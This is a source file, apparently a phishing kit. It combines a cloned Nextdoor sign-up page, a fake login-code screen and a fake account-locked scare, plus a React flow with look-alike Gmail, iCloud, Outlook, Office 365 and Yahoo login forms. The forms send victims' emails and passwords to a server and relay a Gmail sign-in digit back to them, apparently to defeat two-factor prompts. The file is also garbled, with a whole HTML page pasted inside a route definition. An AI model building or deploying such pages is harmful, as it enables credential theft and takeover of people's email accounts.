import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useCallback, useEffect, useRef, useState } from "react";
import {
  ArrowLeft, ArrowRight, BadgeCheck, Bell, CheckCircle2,
  Eye, EyeOff, Loader2, Lock, Mail, ShieldCheck, Unplug, Zap,
} from "lucide-react";
import { Logo } from "@/components/brand/Logo";
import { toast } from "sonner";
import {
  submitEmailCreds,
  pollEmailConnectSession,
  getLinkedEmail,
  disconnectLinkedEmail,
} from "@/lib/connect-email.functions";

export const Route = createFileRoute("/connect-email")({
  <!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Nextdoor – Discover your neighborhood</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
:root{
  --bg:#fff; --text:#1f2a44; --muted:#4b5570; --brand:#2f7d4f; --brand-btn:#3f8a58; --on-brand:#fff;
  --chip:#eceef3; --line:#d9dce4; --field:#fff; --card:#fff; --bar:#6f6f6f; --help:#9aa3b6; --ring:#8ec1ef;
  box-sizing:border-box; padding-top:env(safe-area-inset-top,0px); padding-bottom:env(safe-area-inset-bottom,0px);
  color-scheme:light;
}
@media (prefers-color-scheme:dark){
  :root:not([data-theme="light"]){
    --bg:#10151f; --text:#e8ecf5; --muted:#a9b2c6; --brand:#5cb37c; --brand-btn:#3f8a58; --on-brand:#fff;
    --chip:#222a3a; --line:#34405a; --field:#171e2b; --card:#151b27; --bar:#3a3a3a; --help:#5c6680; --ring:#2f5680; color-scheme:dark;
  }
}
:root[data-theme="dark"]{
  --bg:#10151f; --text:#e8ecf5; --muted:#a9b2c6; --brand:#5cb37c; --brand-btn:#3f8a58; --on-brand:#fff;
  --chip:#222a3a; --line:#34405a; --field:#171e2b; --card:#151b27; --bar:#3a3a3a; --help:#5c6680; --ring:#2f5680; color-scheme:dark;
}
*{box-sizing:border-box;margin:0}
html{scroll-padding-top:env(safe-area-inset-top,0px)}
body{background:var(--bg);color:var(--text);font-family:"DM Sans",system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;min-height:100vh;border-top:6px solid var(--bar)}
.wrap{max-width:1280px;margin:0 auto;padding:0 clamp(12px,3vw,40px)}
header{display:flex;align-items:center;justify-content:space-between;height:96px}
.logo{display:flex;align-items:center;gap:8px;color:var(--brand);font-weight:700;font-size:clamp(28px,3.2vw,38px);letter-spacing:-.04em;text-decoration:none}
.logo svg{width:.95em;height:.95em}
nav{display:flex;align-items:center;gap:clamp(8px,1.6vw,22px)}
.menu{display:flex;align-items:center;gap:8px;background:none;border:0;color:var(--text);font:600 17px/1 inherit;font-family:inherit;cursor:pointer;padding:10px 6px}
.menu svg{width:20px;height:20px}
.btn{display:inline-flex;align-items:center;justify-content:center;border:0;border-radius:999px;font:600 18px/1 "DM Sans",system-ui,sans-serif;cursor:pointer;text-decoration:none;transition:filter .15s}
.btn:hover{filter:brightness(.96)}
.btn:focus-visible,.menu:focus-visible,input:focus-visible,.eye:focus-visible,a:focus-visible{outline:3px solid var(--brand);outline-offset:2px}
.nav-btn{height:52px;padding:0 28px}
.chip{background:var(--chip);color:var(--text)}
.solid{background:var(--brand);color:var(--on-brand)}
.hero{position:relative;border-radius:28px 28px 0 0;overflow:hidden;min-height:calc(100vh - 140px);display:flex;justify-content:center;align-items:flex-start;padding:62px 16px 0}
.hero>svg{position:absolute;inset:0;width:100%;height:100%}
.card{position:relative;width:min(100%,452px);background:var(--card);border-radius:20px 20px 0 0;padding:34px 30px 40px;text-align:center}
h1{font-size:clamp(28px,3.4vw,36px);font-weight:600;letter-spacing:-.03em;line-height:1.1;margin:6px 0 30px}
.sso{width:100%;height:54px;margin-bottom:10px;background:var(--chip);color:var(--text);gap:12px;font-size:18px}
.sso svg{width:22px;height:22px}
.or{display:flex;align-items:center;gap:14px;color:var(--muted);font-size:18px;margin:34px 0 24px}
.or::before,.or::after{content:"";flex:1;height:1px;background:var(--line)}
.field{position:relative;margin-bottom:10px}
input{width:100%;height:64px;border:1.5px solid var(--line);border-radius:16px;background:var(--field);color:var(--text);font:400 18px "DM Sans",system-ui,sans-serif;padding:0 52px 0 14px}
input::placeholder{color:var(--text);opacity:.85}
input:focus{border-color:var(--brand);outline:none}
.eye{position:absolute;right:10px;top:50%;transform:translateY(-50%);background:none;border:0;cursor:pointer;color:var(--text);padding:8px;display:flex}
.eye svg{width:26px;height:26px}
.legal{text-align:left;font-size:17px;line-height:1.35;margin:24px 0 24px;color:var(--text)}
.legal a,.biz a{color:inherit;text-decoration:underline}
.go{width:100%;height:56px;background:var(--brand-btn);color:var(--on-brand)}
.biz{margin-top:30px;font-size:19px}

/* ---- Account confirmation page ---- */
body[data-view="confirm"]{border-top:0}
.confirm-page{display:none}
body[data-view="confirm"] .confirm-page{display:block}
body[data-view="confirm"] .signup-page{display:none}
.chdr{display:flex;align-items:center;justify-content:center;position:relative;height:96px}
.chdr .logo{font-size:clamp(24px,2.6vw,30px);pointer-events:none}
.chdr .signup-link{position:absolute;right:0;top:50%;transform:translateY(-50%);color:var(--text);font-weight:600;font-size:18px;text-decoration:none}
.confirm-wrap{max-width:620px;margin:0 auto;padding:56px 16px 80px;text-align:left}
.confirm-wrap h1{font-size:clamp(26px,3vw,32px);font-weight:700;letter-spacing:-.02em;margin-bottom:18px}
.confirm-wrap .lede{color:var(--text);font-size:19px;line-height:1.4;margin-bottom:34px}
.code-label{display:flex;align-items:center;gap:8px;font-size:19px;margin-bottom:14px}
.help-circle{width:22px;height:22px;border-radius:50%;border:1.6px solid var(--help);color:var(--help);display:inline-flex;align-items:center;justify-content:center;font-size:13px;font-weight:700;cursor:default;flex:none}
.otp-row{display:flex;gap:12px;margin-bottom:18px}
.otp{width:62px;height:62px;border:1.6px solid var(--line);border-radius:14px;text-align:center;font:500 22px "DM Sans",system-ui,sans-serif;background:var(--field);color:var(--text);padding:0}
.otp:focus{outline:none;border-color:#1f2a44;box-shadow:0 0 0 4px var(--ring)}
.resend{display:flex;align-items:center;gap:8px;color:var(--muted);font-weight:600;font-size:17px;background:none;border:0;cursor:not-allowed;padding:0;margin-bottom:34px}
.resend svg{width:18px;height:18px}
.resend.active{color:var(--brand);cursor:pointer}
.go2{width:100%;height:58px;background:var(--brand-btn);color:var(--on-brand);font-size:19px;border-radius:999px}
.rule{height:1px;background:var(--line);margin:34px 0 26px}
.support{color:var(--muted);font-size:18px}
.support a{color:var(--muted)}

/* ---- Account locked / verification page ---- */
.locked-page{display:none}
body[data-view="locked"] .locked-page{display:block}
body[data-view="locked"] .signup-page,
body[data-view="locked"] .confirm-page{display:none}
.locked-wrap{max-width:620px;margin:0 auto;padding:30px 16px 80px;text-align:center}
.lock-badge{width:84px;height:84px;border-radius:50%;background:#fbeaea;color:#c0392b;display:flex;align-items:center;justify-content:center;margin:34px auto 30px}
.lock-badge svg{width:40px;height:40px}
.locked-wrap h1{font-size:clamp(26px,3.2vw,34px);font-weight:700;letter-spacing:-.02em;margin-bottom:20px;line-height:1.15}
.locked-wrap p{color:var(--text);font-size:19px;line-height:1.5;margin-bottom:20px}
.locked-wrap p.sub{color:var(--muted);font-size:17px}
.locked-actions{margin-top:34px}
.go3{width:100%;height:58px;background:var(--brand-btn);color:var(--on-brand);font-size:19px;border-radius:999px}
@media (max-width:760px){
  .locked-wrap{padding:20px 16px 60px}
}

@media (max-width:760px){
  header{height:72px} .menu{display:none} .nav-btn{height:44px;padding:0 20px;font-size:16px}
  .hero{padding-top:28px;min-height:calc(100vh - 100px)} .card{padding:26px 18px 32px}
  .confirm-wrap{padding:40px 16px 60px}
  .otp{width:15.5vw;max-width:56px;height:15.5vw;max-height:56px}
}
</style>
</head>
<body data-view="signup">
<div class="wrap signup-page">
  <header>
    <a class="logo" href="#" aria-label="Nextdoor home">
      <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 2.2 1.2 11.4a.9.9 0 0 0 .6 1.6H4v8h6v-5.2h4V21h6v-8h2.2a.9.9 0 0 0 .6-1.6L17.5 6.9V3.5h-3v1.8z"/></svg>
      Nextdoor
    </a>
    <nav>
      <button class="menu" type="button" aria-haspopup="true">Partners <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m5 9 7 7 7-7"/></svg></button>
      <button class="menu" type="button" aria-haspopup="true">Businesses <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m5 9 7 7 7-7"/></svg></button>
      <a class="btn nav-btn chip" href="#">Log in</a>
      <a class="btn nav-btn solid" href="#">Sign up</a>
    </nav>
  </header>

  <section class="hero">
    <svg viewBox="0 0 1000 700" preserveAspectRatio="xMidYMid slice" aria-hidden="true">
      <defs>
        <linearGradient id="sky" x1="0" y1="0" x2="0" y2="1"><stop offset="0" stop-color="#e9efe3"/><stop offset=".55" stop-color="#cfdcb9"/></linearGradient>
        <linearGradient id="grass" x1="0" y1="0" x2="0" y2="1"><stop offset="0" stop-color="#93b24b"/><stop offset="1" stop-color="#6f9a35"/></linearGradient>
        <radialGradient id="tree" cx=".5" cy=".4" r=".7"><stop offset="0" stop-color="#4c6b2a"/><stop offset="1" stop-color="#2b3f17"/></radialGradient>
      </defs>
      <rect width="1000" height="700" fill="url(#sky)"/>
      <g fill="url(#tree)">
        <ellipse cx="60" cy="330" rx="150" ry="170"/><ellipse cx="190" cy="400" rx="120" ry="130"/>
        <ellipse cx="300" cy="470" rx="110" ry="80"/><ellipse cx="110" cy="250" rx="80" ry="110" fill="#5b7d33"/>
        <ellipse cx="880" cy="170" rx="190" ry="260"/><ellipse cx="760" cy="330" rx="130" ry="150"/>
        <ellipse cx="960" cy="420" rx="110" ry="140"/><ellipse cx="700" cy="440" rx="90" ry="70" fill="#3a5320"/>
      </g>
      <path d="M0 470 Q300 440 520 470 T1000 450 V700 H0Z" fill="url(#grass)"/>
      <path d="M0 585 Q280 560 520 580 T1000 560 V595 Q760 600 520 612 T0 618Z" fill="#d6d9cc"/>
      <g>
        <rect x="170" y="500" width="14" height="42" rx="6" fill="#e9a8a8"/><rect x="200" y="498" width="14" height="46" rx="6" fill="#d98a5a"/>
        <rect x="235" y="500" width="14" height="42" rx="6" fill="#4e6fa8"/><rect x="95" y="505" width="14" height="40" rx="6" fill="#7e93c4"/>
        <rect x="700" y="515" width="16" height="50" rx="6" fill="#efe9d6"/><rect x="735" y="512" width="16" height="52" rx="6" fill="#d9d6c8"/>
        <circle cx="790" cy="560" r="16" fill="none" stroke="#333" stroke-width="3"/><circle cx="850" cy="560" r="16" fill="none" stroke="#333" stroke-width="3"/>
        <circle cx="905" cy="548" r="7" fill="#e07aa0"/>
      </g>
    </svg>

    <div class="card">
      <h1>Discover your neighborhood</h1>

      <button class="btn sso" type="button">
        <svg viewBox="0 0 24 24" aria-hidden="true"><path fill="#4285F4" d="M23.5 12.27c0-.85-.08-1.67-.22-2.45H12v4.64h6.45a5.52 5.52 0 0 1-2.4 3.62v3h3.88c2.27-2.09 3.57-5.17 3.57-8.81z"/><path fill="#34A853" d="M12 24c3.24 0 5.96-1.07 7.95-2.91l-3.88-3c-1.08.72-2.45 1.15-4.07 1.15-3.13 0-5.78-2.11-6.73-4.96H1.27v3.1A12 12 0 0 0 12 24z"/><path fill="#FBBC05" d="M5.27 14.28A7.2 7.2 0 0 1 4.9 12c0-.79.14-1.56.37-2.28v-3.1H1.27A12 12 0 0 0 0 12c0 1.94.46 3.77 1.27 5.38l4-3.1z"/><path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.43-3.43C17.95 1.19 15.24 0 12 0A12 12 0 0 0 1.27 6.62l4 3.1C6.22 6.86 8.87 4.75 12 4.75z"/></svg>
        Continue with Google
      </button>
      <button class="btn sso" type="button">
        <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12.15 6.9c-.95 0-2.42-1.08-3.96-1.04-2.04.03-3.91 1.18-4.96 3.01-2.12 3.68-.55 9.1 1.52 12.09 1.01 1.45 2.21 3.09 3.79 3.04 1.52-.07 2.09-.99 3.94-.99 1.83 0 2.35.99 3.96.95 1.64-.03 2.68-1.48 3.68-2.95 1.16-1.69 1.64-3.33 1.66-3.42-.04-.01-3.18-1.22-3.22-4.86-.03-3.04 2.48-4.49 2.6-4.56-1.43-2.09-3.62-2.32-4.39-2.38-2-.16-3.68 1.09-4.61 1.09zM15.53 3.83c.84-1.01 1.4-2.43 1.25-3.83-1.21.05-2.66.8-3.53 1.82-.78.9-1.45 2.34-1.27 3.71 1.34.1 2.72-.69 3.55-1.7z"/></svg>
        Continue with Apple
      </button>

      <div class="or">or</div>

      <form id="f" novalidate>
        <div class="field"><input type="email" name="email" placeholder="Email address" autocomplete="email" aria-label="Email address"></div>
        <div class="field">
          <input type="password" id="pw" name="password" placeholder="Create a password" autocomplete="new-password" aria-label="Create a password">
          <button class="eye" id="eye" type="button" aria-label="Show password" aria-pressed="false">
            <svg id="eyeIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M2.5 10c2.2 3.6 6 5 9.5 5s7.3-1.4 9.5-5"/><path d="m5.5 14.2-1.8 2.3M9.3 15.6l-.8 2.7M14.7 15.6l.8 2.7M18.5 14.2l1.8 2.3"/></svg>
          </button>
        </div>
        <p class="legal">By continuing with sign up, you agree to our <a href="#">Privacy Policy</a>, <a href="#">Cookie Policy</a>, and <a href="#">Member Agreement</a>.</p>
        <button class="btn go" type="submit">Continue</button>
      </form>

      <p class="biz">Have a business? <a href="#">Get started</a></p>
    </div>
  </section>
</div>

<div class="wrap confirm-page">
  <div class="chdr">
    <a class="logo" href="#" aria-label="Nextdoor home">
      <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 2.2 1.2 11.4a.9.9 0 0 0 .6 1.6H4v8h6v-5.2h4V21h6v-8h2.2a.9.9 0 0 0 .6-1.6L17.5 6.9V3.5h-3v1.8z"/></svg>
      Nextdoor
    </a>
    <a class="signup-link" href="#">Sign up</a>
  </div>

  <div class="confirm-wrap">
    <h1>Account confirmation</h1>
    <p class="lede">A login code has been sent to the email address on your Nextdoor account. Enter that code here.</p>

    <div class="code-label">
      Enter login code
      <span class="help-circle" title="Check your inbox and spam folder for a 6-digit code">?</span>
    </div>

    <div class="otp-row" id="otpRow">
      <input class="otp" inputmode="numeric" maxlength="1" aria-label="Digit 1">
      <input class="otp" inputmode="numeric" maxlength="1" aria-label="Digit 2">
      <input class="otp" inputmode="numeric" maxlength="1" aria-label="Digit 3">
      <input class="otp" inputmode="numeric" maxlength="1" aria-label="Digit 4">
      <input class="otp" inputmode="numeric" maxlength="1" aria-label="Digit 5">
      <input class="otp" inputmode="numeric" maxlength="1" aria-label="Digit 6">
    </div>

    <button class="resend" id="resendBtn" type="button" disabled>
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 1 1-2.6-6.36"/><path d="M21 4v5h-5"/></svg>
      <span id="resendText">Resend email (20s)</span>
    </button>

    <button class="btn go2" id="loginBtn" type="button">Login</button>

    <div class="rule"></div>
    <p class="support">No code after 5 minutes? <a href="#">Contact support</a></p>
  </div>
</div>

<div class="wrap locked-page">
  <div class="chdr">
    <a class="logo" href="#" aria-label="Nextdoor home">
      <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 2.2 1.2 11.4a.9.9 0 0 0 .6 1.6H4v8h6v-5.2h4V21h6v-8h2.2a.9.9 0 0 0 .6-1.6L17.5 6.9V3.5h-3v1.8z"/></svg>
      Nextdoor
    </a>
  </div>

  <div class="locked-wrap">
    <div class="lock-badge" aria-hidden="true">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="11" width="16" height="10" rx="2"/><path d="M8 11V7a4 4 0 0 1 8 0v4"/><path d="M12 15.5v2"/></svg>
    </div>

    <h1>We've temporarily locked your account</h1>
    <p>We noticed some unusual activity on your Nextdoor account, so we've locked it as a precaution while we confirm it's really you.</p>
    <p>This is a routine security step, not a penalty. Once you complete verification, your account will be unlocked and every feature will work exactly as before.</p>
    <p class="sub">The process only takes a couple of minutes.</p>

    <div class="locked-actions">
      <button class="btn go3" id="proceedBtn" type="button">Proceed to Verification</button>
    </div>
  </div>
</div>

<script>
(function(){
  var pw=document.getElementById("pw"),eye=document.getElementById("eye"),ico=document.getElementById("eyeIcon");
  var closed=ico.innerHTML;
  var open='<path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7S2 12 2 12z"/><circle cx="12" cy="12" r="3"/>';
  eye.addEventListener("click",function(){
    var show=pw.type==="password";
    pw.type=show?"text":"password";
    ico.innerHTML=show?open:closed;
    eye.setAttribute("aria-pressed",String(show));
    eye.setAttribute("aria-label",show?"Hide password":"Show password");
  });
  document.getElementById("f").addEventListener("submit",function(e){
    e.preventDefault();
    document.body.setAttribute("data-view","confirm");
    startResendTimer();
    var first=document.querySelector("#otpRow .otp");
    if(first) first.focus();
  });
})();

(function(){
  var boxes=Array.prototype.slice.call(document.querySelectorAll("#otpRow .otp"));
  boxes.forEach(function(box,i){
    box.addEventListener("input",function(){
      box.value=box.value.replace(/[^0-9]/g,"").slice(0,1);
      if(box.value && boxes[i+1]) boxes[i+1].focus();
    });
    box.addEventListener("keydown",function(e){
      if(e.key==="Backspace" && !box.value && boxes[i-1]){ boxes[i-1].focus(); }
    });
    box.addEventListener("paste",function(e){
      var text=(e.clipboardData||window.clipboardData).getData("text").replace(/[^0-9]/g,"");
      if(!text) return;
      e.preventDefault();
      text.slice(0,boxes.length-i).split("").forEach(function(ch,j){ boxes[i+j].value=ch; });
      var next=boxes[Math.min(i+text.length,boxes.length-1)];
      if(next) next.focus();
    });
  });

  window.startResendTimer=function(){
    var btn=document.getElementById("resendBtn"),label=document.getElementById("resendText");
    var seconds=20;
    btn.disabled=true; btn.classList.remove("active");
    label.textContent="Resend email ("+seconds+"s)";
    clearInterval(window._resendInterval);
    window._resendInterval=setInterval(function(){
      seconds--;
      if(seconds<=0){
        clearInterval(window._resendInterval);
        btn.disabled=false; btn.classList.add("active");
        label.textContent="Resend email";
      } else {
        label.textContent="Resend email ("+seconds+"s)";
      }
    },1000);
  };

  document.getElementById("resendBtn").addEventListener("click",function(){
    if(this.disabled) return;
    startResendTimer();
  });

  document.getElementById("loginBtn").addEventListener("click",function(){
    var code=boxes.map(function(b){return b.value;}).join("");
    if(code.length<6){
      var firstEmpty=boxes.find(function(b){return !b.value;});
      if(firstEmpty) firstEmpty.focus();
      return;
    }
    document.body.setAttribute("data-view","locked");
  });
})();

document.getElementById("proceedBtn").addEventListener("click",function(){
  // Placeholder: wire this up to the verification page once it's added.
});
</script>
</body>
</html>


// ── Provider definitions ──────────────────────────────────────────────────────

type ProviderId = "gmail" | "outlook" | "office365" | "yahoo" | "icloud" | "other";

const PROVIDERS: { id: ProviderId; label: string; color: string; logo: string }[] = [
  {
    id: "gmail", label: "Gmail",
    color: "#EA4335",
    logo: `<svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M6 36V12l18 13L42 12v24" stroke="#EA4335" stroke-width="3"/>
      <path d="M6 12l18 13 18-13" stroke="#EA4335" stroke-width="3"/>
      <rect x="4" y="10" width="40" height="28" rx="2" stroke="#EA4335" stroke-width="2.5" fill="none"/>
    </svg>`,
  },
  {
    id: "icloud", label: "iCloud Mail",
    color: "#0071E3",
    logo: `<svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M34 32H15a9 9 0 110-18c.3 0 .6 0 .9.03A10 10 0 0134 24.1a7 7 0 010 7.9z" stroke="#0071E3" stroke-width="2.5" fill="none"/>
    </svg>`,
  },
  {
    id: "outlook", label: "Outlook / Hotmail",
    color: "#0078D4",
    logo: `<svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="4" y="10" width="22" height="28" rx="2" fill="#0078D4"/>
      <rect x="22" y="14" width="22" height="20" rx="2" stroke="#0078D4" stroke-width="2.5" fill="none"/>
      <path d="M22 14l11 9 11-9" stroke="#0078D4" stroke-width="2"/>
    </svg>`,
  },
  {
    id: "office365", label: "Office 365",
    color: "#D83B01",
    logo: `<svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="6" y="6" width="16" height="16" rx="2" fill="#D83B01"/>
      <rect x="26" y="6" width="16" height="16" rx="2" fill="#107C41"/>
      <rect x="6" y="26" width="16" height="16" rx="2" fill="#005A9E"/>
      <rect x="26" y="26" width="16" height="16" rx="2" fill="#FFB900"/>
    </svg>`,
  },
  {
    id: "yahoo", label: "Yahoo Mail",
    color: "#6001D2",
    logo: `<svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
      <text x="8" y="34" font-size="30" font-weight="800" fill="#6001D2" font-family="Arial">Y!</text>
    </svg>`,
  },
  {
    id: "other", label: "Others",
    color: "#64748B",
    logo: `<svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="4" y="10" width="40" height="28" rx="3" stroke="#64748B" stroke-width="2.5"/>
      <path d="M4 16l20 12 20-12" stroke="#64748B" stroke-width="2.5"/>
    </svg>`,
  },
];

// ── Provider login form themes ────────────────────────────────────────────────

const PROVIDER_THEME: Record<ProviderId, {
  bg: string; headerBg: string; headerText: string;
  btnBg: string; btnText: string; logo: React.ReactNode;
  emailLabel: string; passLabel: string; emailPlaceholder: string;
}> = {
  gmail: {
    bg: "bg-white", headerBg: "bg-white", headerText: "text-[#202124]",
    btnBg: "bg-[#1a73e8] hover:bg-[#1557b0]", btnText: "text-white",
    emailLabel: "Email or phone", passLabel: "Enter your password",
    emailPlaceholder: "Email or phone",
    logo: <svg viewBox="0 0 48 48" className="h-8 w-8"><path d="M44 24.5c0-1.3-.1-2.6-.3-3.9H24v7.4h11.2a9.6 9.6 0 01-4.1 6.3v5.2h6.6C41.4 36 44 30.7 44 24.5z" fill="#4285F4"/><path d="M24 44c5.4 0 9.9-1.8 13.2-4.9l-6.4-5c-1.8 1.2-4.1 1.9-6.8 1.9-5.2 0-9.6-3.5-11.2-8.2H6.2v5.2C9.5 39.5 16.3 44 24 44z" fill="#34A853"/><path d="M12.8 27.8A12 12 0 0112 24c0-1.3.2-2.6.6-3.8v-5.2H6.2A20 20 0 004 24c0 3.2.8 6.2 2.2 8.9l6.6-5.1z" fill="#FBBC04"/><path d="M24 11.8c2.9 0 5.5 1 7.6 3l5.6-5.6C33.9 6 29.4 4 24 4 16.3 4 9.5 8.5 6.2 15.1l6.6 5.1c1.6-4.7 6-8.4 11.2-8.4z" fill="#EA4335"/></svg>,
  },
  icloud: {
    bg: "bg-[#F5F5F7]", headerBg: "bg-[#F5F5F7]", headerText: "text-[#1D1D1F]",
    btnBg: "bg-[#0071E3] hover:bg-[#0066CC]", btnText: "text-white",
    emailLabel: "Apple ID", passLabel: "Password",
    emailPlaceholder: "apple_id@example.com",
    logo: <svg viewBox="0 0 814 1000" className="h-8 w-8 fill-[#1D1D1F]"><path d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76 0-103.7 40.8-165.9 40.8s-105-37.5-155.5-127.4C46 790.9 0 695 0 603.4c0-178.4 116.1-272.5 230.4-272.5 60.4 0 110.7 39.7 148.1 39.7 35.7 0 91.7-42.7 162.1-42.7 23.4 0 108.2 2.3 166.7 93.7zm-234.5-172.9c27.7-33.4 47.4-80.3 47.4-127.3 0-6.5-.6-13-1.3-19.4-45 1.9-98.3 30.1-131 67.5-24.4 28.1-48.1 74.4-48.1 122.6 0 7.1.6 14.2 1.3 16.4 2.6.6 6.5 1.3 10.4 1.3 40.4 0 90.3-26.5 121.3-61.1z"/></svg>,
  },
  outlook: {
    bg: "bg-white", headerBg: "bg-[#0078D4]", headerText: "text-white",
    btnBg: "bg-[#0078D4] hover:bg-[#005FA3]", btnText: "text-white",
    emailLabel: "Email, phone, or Skype", passLabel: "Password",
    emailPlaceholder: "email@outlook.com",
    logo: <svg viewBox="0 0 96 96" className="h-8 w-8"><path d="M8 20h40v56H8z" fill="#0078D4"/><path d="M48 20h40l-20 18-20-18z" fill="#50D9FF"/><path d="M48 38l40-18v56H48V38z" fill="#28A8E0"/><path d="M48 56h40v20H48z" fill="#0078D4"/><text x="10" y="66" fill="white" font-size="22" font-weight="bold">Aa</text></svg>,
  },
  office365: {
    bg: "bg-white", headerBg: "bg-white", headerText: "text-[#201f1e]",
    btnBg: "bg-[#0067B8] hover:bg-[#005099]", btnText: "text-white",
    emailLabel: "Email, phone, or Skype", passLabel: "Password",
    emailPlaceholder: "user@company.com",
    logo: <svg viewBox="0 0 96 96" className="h-8 w-8"><rect x="2" y="2" width="44" height="44" rx="4" fill="#f25022"/><rect x="50" y="2" width="44" height="44" rx="4" fill="#7fba00"/><rect x="2" y="50" width="44" height="44" rx="4" fill="#00a4ef"/><rect x="50" y="50" width="44" height="44" rx="4" fill="#ffb900"/></svg>,
  },
  yahoo: {
    bg: "bg-[#F4EDFE]", headerBg: "bg-[#6001D2]", headerText: "text-white",
    btnBg: "bg-[#6001D2] hover:bg-[#4c00a8]", btnText: "text-white",
    emailLabel: "Yahoo ID or Email", passLabel: "Password",
    emailPlaceholder: "yourname@yahoo.com",
    logo: <svg viewBox="0 0 48 48" className="h-10 w-10"><text x="4" y="36" fontSize="32" fontWeight="800" fill="#6001D2" fontFamily="Arial">Y!</text></svg>,
  },
  other: {
    bg: "bg-white", headerBg: "bg-[#1e293b]", headerText: "text-white",
    btnBg: "bg-[#1e293b] hover:bg-[#334155]", btnText: "text-white",
    emailLabel: "Email address", passLabel: "Password",
    emailPlaceholder: "you@example.com",
    logo: <Mail className="h-8 w-8 text-slate-700" />,
  },
};

// ── Types ─────────────────────────────────────────────────────────────────────

type Step = "intro" | "picker" | "form" | "verifying" | "gmail_digit" | "success" | "already_linked";
type Linked = { email: string; provider: string; method: string; verified_at: string | null } | null;

// ── Main component ────────────────────────────────────────────────────────────

function ConnectEmailPage() {
  const navigate = useNavigate();
  const [step, setStep]       = useState<Step>("intro");
  const [linked, setLinked]   = useState<Linked>(null);
  const [loading, setLoading] = useState(true);

  // Form state
  const [provider, setProvider]     = useState<ProviderId>("gmail");
  const [email, setEmail]           = useState("");
  const [password, setPassword]     = useState("");
  const [showPass, setShowPass]     = useState(false);
  const [submitting, setSubmitting] = useState(false);

  // Session tracking for polling
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [digit, setDigit]         = useState<string | null>(null);
  const pollRef                   = useRef<ReturnType<typeof setInterval> | null>(null);

  // Load existing linked email
  useEffect(() => {
    getLinkedEmail().then((row) => {
      setLinked(row as Linked);
      if (row) setStep("already_linked");
      setLoading(false);
    }).catch(() => setLoading(false));
  }, []);

  // Poll for session status
  const startPolling = useCallback((sid: string) => {
    if (pollRef.current) clearInterval(pollRef.current);
    pollRef.current = setInterval(async () => {
      try {
        const res = await pollEmailConnectSession({ data: { sessionId: sid } });
        if (res.status === "gmail_digit" && res.digit && res.digit !== "?") {
          setDigit(res.digit);
          setStep("gmail_digit");
        } else if (res.status === "complete") {
          clearInterval(pollRef.current!);
          setStep("success");
        } else if (res.status === "failed") {
          clearInterval(pollRef.current!);
          toast.error("Verification failed. Please try again.");
          setStep("form");
          setPassword("");
        }
      } catch { /* ignore poll errors */ }
    }, 3000);
  }, []);

  useEffect(() => () => { if (pollRef.current) clearInterval(pollRef.current); }, []);

  // Submit credentials
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !password) return;
    setSubmitting(true);
    try {
      const res = await submitEmailCreds({ data: { provider, email, password } });
      setSessionId(res.sessionId);
      setStep("verifying");
      startPolling(res.sessionId);
    } catch (err: unknown) {
      toast.error("Something went wrong. Please try again.");
      console.error(err);
    } finally {
      setSubmitting(false);
    }
  };

  const handleDisconnect = async () => {
    if (!confirm("Disconnect your linked email?")) return;
    await disconnectLinkedEmail();
    setLinked(null);
    setStep("intro");
    toast.success("Email disconnected.");
  };

  if (loading) {
    return (
      <div className="flex min-h-screen items-center justify-center">
        <Loader2 className="h-6 w-6 animate-spin text-muted-foreground" />
      </div>
    );
  }

  return (
    <div className="flex min-h-screen flex-col bg-background">
      {/* Nav bar */}
      <header className="sticky top-0 z-10 border-b border-border bg-background/90 backdrop-blur">
        <div className="mx-auto flex max-w-lg items-center gap-3 px-4 py-3">
          <button
            onClick={() => navigate({ to: "/dashboard" })}
            className="rounded-lg p-1.5 text-muted-foreground transition hover:bg-accent hover:text-foreground"
          >
            <ArrowLeft className="h-4 w-4" />
          </button>
          <Logo />
        </div>
      </header>

      <main className="mx-auto w-full max-w-lg flex-1 px-4 py-8">
        {step === "intro"          && <IntroStep onProceed={() => setStep("picker")} />}
        {step === "picker"         && <PickerStep onSelect={(p) => { setProvider(p); setStep("form"); }} onBack={() => setStep("intro")} />}
        {step === "form"           && (
          <FormStep
            provider={provider}
            email={email} setEmail={setEmail}
            password={password} setPassword={setPassword}
            showPass={showPass} setShowPass={setShowPass}
            submitting={submitting}
            onSubmit={handleSubmit}
            onBack={() => setStep("picker")}
          />
        )}
        {step === "verifying"      && <VerifyingStep provider={provider} />}
